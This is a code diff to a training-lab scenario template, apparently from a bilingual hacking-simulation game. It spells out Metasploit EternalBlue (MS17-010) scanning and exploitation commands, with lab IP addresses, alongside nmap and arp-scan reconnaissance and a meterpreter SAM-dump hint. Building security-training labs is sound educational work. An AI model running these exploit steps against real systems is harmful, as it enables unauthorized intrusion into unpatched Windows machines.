@@ -47,15 +47,15 @@ export const SCENARIO_TEMPLATES_ETERNAL = {
         directories: [],
       },
       files: [
-        createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', 'THM{ETERNALBLUE_SYSTEM_PWNED}'),
+        createFile('C:\\\\Users\\\\Administrator\\\\Desktop\\\\flag.txt', 'ZIL{ETERNALBLUE_SYSTEM_PWNED}'),
         createFile('C:\\\\Windows\\\\System32\\\\config\\\\SAM', '[SAM Database — use hashdump]', 'binary'),
       ],
     },
     learningSteps: [
       { task: 'Network Reconnaissance', taskEs: 'Reconocimiento de red', text: 'Discover hosts: arp-scan <network/cidr>', textEs: 'Descubrir hosts: arp-scan <network/cidr>', discoveryLevel: 1 },
       { task: 'Port Scanning', taskEs: 'Escaneo de puertos', text: 'Identify services: nmap -sV <target-ip>', textEs: 'Identificar servicios: nmap -sV <target-ip>', discoveryLevel: 2 },
-      { task: 'Verify Vulnerability', taskEs: 'Verificar vulnerabilidad', text: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', textEs: 'msfconsole: use auxiliary/scanner/smb/smb_ms17_010 → set RHOSTS → run', discoveryLevel: 2 },
-      { task: 'Exploit EternalBlue', taskEs: 'Explotar EternalBlue', text: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', textEs: 'use exploit/windows/smb/ms17_010_eternalblue → set RHOSTS/LHOST → exploit', discoveryLevel: 3 },
+      { task: 'Verify Vulnerability', taskEs: 'Verificar vulnerabilidad', text: 'Execute  1. msfconsole  2. use auxiliary/scanner/smb/smb_ms17_010  3. set rhosts 172.16.0.11  4. run', textEs: 'Ejecutar  1. msfconsole  2. use auxiliary/scanner/smb/smb_ms17_010  3. set rhosts 172.16.0.11  4. run', discoveryLevel: 2 },
+      { task: 'Exploit EternalBlue', taskEs: 'Explotar EternalBlue', text: 'Execute  1. use exploit/windows/smb/ms17_010_eternalblue  2. set RHOSTS 172.16.0.11  3. set LHOST 172.16.0.10  4. exploit', textEs: 'Ejecutar  1. use exploit/windows/smb/ms17_010_eternalblue  2. set RHOSTS 172.16.0.11  3. set LHOST 172.16.0.10  4. exploit', discoveryLevel: 3 },
       { task: 'Verify SYSTEM Access', taskEs: 'Verificar acceso SYSTEM', text: 'meterpreter: getuid', textEs: 'meterpreter: getuid', discoveryLevel: 4 },
     ],
   }),
